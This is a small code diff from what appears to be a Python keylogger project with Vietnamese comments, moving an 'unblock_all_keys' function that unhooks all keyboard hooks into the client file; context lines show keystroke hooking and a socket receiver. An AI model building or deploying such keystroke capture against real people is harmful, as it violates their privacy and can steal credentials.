@@ -1,7 +1,5 @@
 import keyboard
 
-from Server.key_logger_server import unblock_all_keys
-
 def receive_key_loggers(client_socket):
     """Nhận và ghi lại các phím được nhấn từ server."""
     while True:
@@ -31,6 +29,10 @@ def start_keylogger(client_socket):
     keyboard.hook(on_key_event)
     print("Keylogger is running. Press 'Esc' to stop.")
     keyboard.wait('esc')  # Chờ cho đến khi có sự kiện Esc được nhấn
+
+def unblock_all_keys():
+    """Mở khóa tất cả các phím bằng cách bỏ hết hook."""
+    keyboard.unhook_all()  # Gỡ bỏ tất cả các hook, mở khóa mọi phí
 
 # Đặt danh sách các phím hợp lệ
 normal_keys = [
